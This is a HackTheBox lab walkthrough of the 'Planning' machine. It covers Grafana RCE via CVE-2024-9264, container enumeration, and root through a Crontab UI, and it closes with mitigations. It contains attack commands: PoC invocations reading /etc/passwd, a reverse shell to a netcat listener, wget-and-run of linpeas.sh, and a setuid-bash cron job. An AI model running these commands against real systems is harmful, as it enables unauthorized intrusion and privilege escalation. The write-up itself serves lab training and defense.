# Planning — HackTheBox Writeup

**Machine IP**: `10.10.11.68`
**Author**: Mridul Chamoli
**Difficulty**: Easy–Medium
**Category**: Linux | Web | Container Escape | Privilege Escalation

---

## Introduction

Planning is an Easy Linux machine on HackTheBox that covers key pentesting techniques such as **Grafana exploitation**, **container escape**, and **privilege escalation** via a Crontab UI. It's a great box for practicing enumeration and escalation skills.

---

## Reconnaissance

I started with a full-service nmap scan to identify open ports and services:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/planning$ nmap -sV -sC -A 10.10.11.68
```

Findings:

* `22/tcp` — OpenSSH 9.6p1 (Ubuntu)
* `80/tcp` — nginx 1.24.0 serving a Grafana instance (login at `/login`)

I added the hostnames to `/etc/hosts`:

```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
echo "10.10.11.68 grafana.planning.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

Vhost enumeration (Gobuster) revealed a Grafana subdomain. Visiting `http://grafana.planning.htb` presented a Grafana login panel. I used the provided lab credentials:

* **Username:** `admin`
* **Password:** `0D5oT70Fq13EvB5r`

The Grafana version on the box was vulnerable to **CVE-2024-9264** (SQL Expressions / DuckDB injection leading to LFI/RCE for certain versions).

---

## Exploitation — CVE-2024-9264 (Grafana Authenticated RCE)

I confirmed the Grafana RCE by using public Proof-of-Concept exploit code. First I tested a simple command to verify code execution:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /etc/passwd" http://grafana.planning.htb/
```

Then I checked privilege level:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "whoami" http://grafana.planning.htb/
# output: root
```

Because the initial PoC sometimes ran inside a container with restricted tooling, I used an alternate PoC (z3k0sec) to get a more stable reverse shell. Example flow:

1. Start a listener: `nc -lnvp 4444` on attacker.
2. Run PoC with reverse IP/port:

```bash
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip <attacker-ip> --reverse-port 4444
```

This returned a root shell inside the Grafana container.

---

## Container Enumeration & Escape

Inside the Grafana container (dropped at `/usr/share/grafana`), I ran LinPEAS to automate local enumeration.

On attacker machine:

```bash
python3 -m http.server 8000
```

Inside container:

```bash
wget http://10.10.14.62:8000/linpeas.sh && bash linpeas.sh
```

LinPEAS revealed sensitive credentials stored in environment variables. Using the discovered credentials:

* **Username:** `enzo`
* **Password:** `RioTecRANDEntANT!`

I used these to SSH to the host (not the container):

```bash
ssh enzo@planning.htb
```

---

## User Flag

After logging in as `enzo`, I retrieved the user flag from the home directory:

```bash
cat ~/user.txt
```

---

## Privilege Escalation — Crontab UI

Running LinPEAS on the host revealed a crontab database at `/opt/crontabs/crontab.db` which included scheduled jobs and hardcoded credentials (a ZIP password):

* **Backup job**: runs a Docker save and zips it with password `P4ssw0rdS0pRi0T3c`
* **Cleanup job**: runs `/root/scripts/cleanup.sh` every minute

Local service enumeration showed a web service bound to `127.0.0.1:8000`. I tunneled it locally with SSH:

```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
# then visit http://127.0.0.1:8000 locally
```

This hosted a **Crontab UI** web interface protected by credentials found in `crontab.db` (root / `P4ssw0rdS0pRi0T3c`). Logging in as root allowed full control over scheduled jobs.

I created a cron job named `test` with the command:

```
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
```

and either scheduled it or clicked **Run Now** in the UI. After execution, `/tmp/bash` had the **setuid** bit set, allowing:

```bash
/tmp/bash -p
# root shell
```

Finally, I captured the root flag from `/root/root.txt`.

---

## Mitigations & Notes

* Patch Grafana to versions that fix CVE-2024-9264; disable experimental SQL Expressions if not needed.
* Avoid storing secrets in environment variables accessible to containers.
* Restrict access to internal-only services bound to `127.0.0.1`.
* Crontab UI installations should not store plaintext credentials and must enforce RBAC and least privilege.
* Monitor and harden Docker image backup processes and protect backup passwords.

---

## Artifacts & References

* Grafana advisory for CVE-2024-9264 (Grafana Labs)
* PoC repos: `nollium/CVE-2024-9264`, `z3k0sec/CVE-2024-9264-RCE-Exploit`
* Crontab UI projects and background on web-based cron dashboards

---
`

*Happy hacking!*
